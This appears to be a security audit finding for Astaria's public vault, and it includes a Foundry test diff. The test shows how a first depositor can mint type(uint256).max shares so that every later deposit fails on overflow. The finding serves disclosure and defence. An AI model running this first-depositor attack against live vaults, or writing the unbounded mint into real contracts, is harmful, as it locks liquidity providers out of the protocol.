-Title- 
DoS attack on a newly created public vault

-Description-
  When a public vault is created, liquidity providers can choose to use deposit() or mint() to provide liquidity. However, the previewMint function does not limit the [amount of shares](https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626-Cloned.sol#L132) that a liquidity provider can get. If the first liquidity provider get uint256.max shares, other liquidity providers will not be able to provide liquidity due to math overflow.

-PoC-
diff --git a/src/test/AstariaTest.t.sol b/src/test/AstariaTest.t.sol
index c7ce162..4726dfe 100644
--- a/src/test/AstariaTest.t.sol
+++ b/src/test/AstariaTest.t.sol
@@ -14,6 +14,7 @@
 pragma solidity =0.8.17;
 
 import "forge-std/Test.sol";
+import "forge-std/StdCheats.sol";
 
 import {Authority} from "solmate/auth/Auth.sol";
 import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
@@ -36,7 +37,7 @@ import {Strings2} from "./utils/Strings2.sol";
 import "./TestHelpers.t.sol";
 import {OrderParameters} from "seaport/lib/ConsiderationStructs.sol";
 
-contract AstariaTest is TestHelpers {
+contract AstariaTest is StdCheats, TestHelpers {
   using FixedPointMathLib for uint256;
   using CollateralLookup for address;
   using SafeCastLib for uint256;
@@ -44,6 +45,44 @@ contract AstariaTest is TestHelpers {
   event NonceUpdated(uint256 nonce);
   event VaultShutdown();
 
+  function testBlockDeposit() external {
+    // 0. setup roles
+    address user = _getSigner("user");
+    deal(address(WETH9), user, 100 ether);
+    address attacker = _getSigner("attacker");
+    deal(address(WETH9), attacker, 100 ether);
+    // 1. create a new vault
+    address publicVaultAddr = _createPublicVault({
+      epochLength: 10 days, // 10 days
+      strategist: strategistTwo,
+      delegate: strategistOne
+    });
+    PublicVault publicVault = PublicVault(publicVaultAddr);
+    // check no minted vault token
+    assertEq(0, publicVault.totalSupply());
+    // 2. attacker is the first depositor to get the max mint amount shares
+    uint256 attackAmount = type(uint256).max;
+    vm.startPrank(attacker);
+    uint256 amount = publicVault.previewMint(attackAmount);
+    assertEq(amount, 10 ether);
+    ERC20(WETH9).approve(publicVaultAddr, amount);
+    publicVault.mint(attackAmount, attacker);
+    vm.stopPrank();
+    // 3. normal user cannot deposit
+    vm.startPrank(user);
+    ERC20(WETH9).approve(publicVaultAddr, amount);
+    uint256 shares = publicVault.deposit(amount, user);
+    uint256 userBalance = publicVault.balanceOf(user);
+    assertEq(shares, userBalance, "wrong share balance");
+    vm.stopPrank();
+  }
+
+  function _getSigner(string memory name) internal returns (address) {
+    address user = makeAddr(name);
+    vm.deal(user, 100 ether);
+    return user;
+  }
+
   function testFeesExample() public {
     uint256 amountOwedToLender = getAmountOwedToLender(15e17, 10e18, 14 days);
     Fees memory fees = getFeesForLiquidation(
